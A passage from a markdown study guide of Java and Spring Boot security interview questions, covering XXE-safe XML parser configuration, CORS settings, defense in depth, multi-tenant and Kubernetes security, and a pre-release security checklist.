> **A**: Auto-configuration can introduce security risks: (1) H2 console auto-enabled with `h2` on classpath — exposes database admin, (2) Spring DevTools enabled in prod — remote code reload, (3) Actuator endpoints exposed by default in older versions, (4) Default security config allows all if spring-security isn't configured correctly. Best practices: use profiles (`application-prod.yml`), explicitly disable unused auto-configs, audit what gets auto-configured with `--debug` flag.

**Q19: How do you prevent XXE in Java XML processing?**

> **A**: Java's XML parsers (DocumentBuilder, SAXParser, XMLReader) allow external entities by default. Prevention:
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```
> Or better: use JSON. If XML is required, consider libraries like Woodstox with secure defaults.

**Q20: What is the security impact of using `@CrossOrigin` broadly in Spring?**

> **A**: `@CrossOrigin` without parameters defaults to allowing ALL origins for that endpoint. Risks: (1) Any website can make credentialed requests if combined with `.allowCredentials(true)`, (2) Can lead to data exfiltration if sensitive endpoints are exposed. Best practice: always specify explicit origins: `@CrossOrigin(origins = "https://app.company.com")`. For API-wide CORS: configure in `SecurityFilterChain` with explicit allowlist, not on individual controllers.

### Architecture & Design (Q21-Q25)

**Q21: How would you implement defense in depth for a Spring Boot microservice?**

> **A**: Layers: (1) API Gateway — rate limiting, WAF, DDoS protection, (2) Spring Security filter chain — authentication, (3) Method-level security — `@PreAuthorize` authorization, (4) Input validation — `@Valid` with Bean Validation, (5) Service layer — business rule validation, (6) Repository layer — parameterized queries, (7) Database — least-privilege user, encryption at rest, (8) Audit logging — security events, (9) Monitoring — anomaly detection on auth patterns.

**Q22: How do you handle security in event-driven architectures with Spring?**

> **A**: Challenges: async message consumers lose security context. Solutions: (1) Include authentication claims in message headers (signed/encrypted), (2) Validate message authenticity (HMAC signature verification), (3) Establish service-level trust (mTLS between message broker and services), (4) Include correlation IDs for audit trail, (5) Input-validate message payloads (malicious events from compromised producers), (6) Dead-letter queue for failed security validations, (7) Message encryption for sensitive payloads.

**Q23: How would you implement a secure multi-tenant application in Spring?**

> **A**: (1) Tenant resolution: extract from JWT claims or subdomain (NEVER from user-supplied parameter), (2) Tenant filter: Hibernate `@FilterDef` or Spring's `TenantContext` — automatically adds WHERE clause, (3) Test: verify no cross-tenant data leakage with integration tests, (4) Separate encryption keys per tenant, (5) Row-level security in database, (6) Audit log with tenant ID, (7) Resource limits per tenant (prevent noisy neighbor).

**Q24: What's the security architecture for a Spring Boot app deployed on Kubernetes?**

> **A**: (1) Container security: minimal base image (distroless), non-root user, read-only filesystem, (2) Network policies: restrict pod-to-pod communication, (3) Secrets: External Secrets Operator or Sealed Secrets (not plain K8s secrets), (4) Service mesh (Istio): mTLS between services, authorization policies, (5) Ingress: TLS termination, rate limiting, WAF, (6) Pod security standards: no privilege escalation, drop all capabilities, (7) Image scanning in CI/CD (Trivy), (8) RBAC: minimal ServiceAccount permissions.

**Q25: How do you balance security and performance in Java applications?**

> **A**: (1) BCrypt cost: 12 is standard (~250ms) — don't go higher without testing latency impact, (2) JWT validation: cache JWKS keys (not re-fetched per request), (3) Rate limiting: use in-memory (Caffeine) for single instance, Redis for distributed, (4) TLS: session resumption reduces handshake overhead, (5) Security filters: order matters — fail fast (authentication before expensive operations), (6) Encryption: use AES-NI hardware acceleration (default in modern JVMs), (7) Input validation: validate early, reject fast (don't process then validate).

---

## 📊 Java Security Checklist

```
╔══════════════════════════════════════════════════════════════════╗
║  JAVA SECURITY CHECKLIST — Before You Ship                       ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  □ All endpoints require authentication (unless explicitly pub)  ║
║  □ All endpoints have authorization checks (ownership/role)      ║
║  □ Passwords hashed with BCrypt/Argon2id (never plaintext/MD5)   ║
║  □ All SQL uses parameterized queries (no string concat)         ║
║  □ Input validated with Bean Validation (@Valid, @NotNull, etc.) ║
║  □ Output encoded for context (Thymeleaf th:text, not th:utext) ║
║  □ Secrets in Vault/env vars (not in code/properties files)      ║
║  □ Dependencies scanned (OWASP dep-check, Snyk, Dependabot)     ║
║  □ SecureRandom for tokens/keys (never java.util.Random)         ║
║  □ No Java serialization of untrusted data (use JSON)            ║
║  □ Jackson: no enableDefaultTyping(), typed @JsonSubTypes only   ║
║  □ Security headers configured (HSTS, CSP, X-Frame-Options)     ║
║  □ Actuator endpoints restricted in production                   ║
║  □ H2 console disabled in production                             ║
║  □ Debug/DevTools disabled in production                         ║
║  □ Audit logging for security events                             ║
║  □ No sensitive data in logs (passwords, tokens, PII)            ║
║  □ Global exception handler (no stack traces to clients)         ║
║  □ Rate limiting on auth endpoints                               ║
║  □ CSRF enabled for cookie-based auth (or JWT = disable safely)  ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
```

---

## 🔗 What's Next?

| Topic | Link | Why Read It? |
|-------|------|-------------|
| Security Scenarios & Puzzles | [06_Security_Scenarios_And_Puzzles.md](./06_Security_Scenarios_And_Puzzles.md) | Apply Java security in realistic challenges |
| Security Interview Cheatsheet | [07_Security_Interview_CheatSheet.md](./07_Security_Interview_CheatSheet.md) | Quick reference for interview day |
| Spring Security in Microservices | [../SecurityInMicroservices.md](../SecurityInMicroservices.md) | Distributed security patterns |

---

*[← Secure Coding Practices](./04_Secure_Coding_Practices_QA.md) | [Back to Security Index](../README.md) | [Next: Security Scenarios →](./06_Security_Scenarios_And_Puzzles.md)*
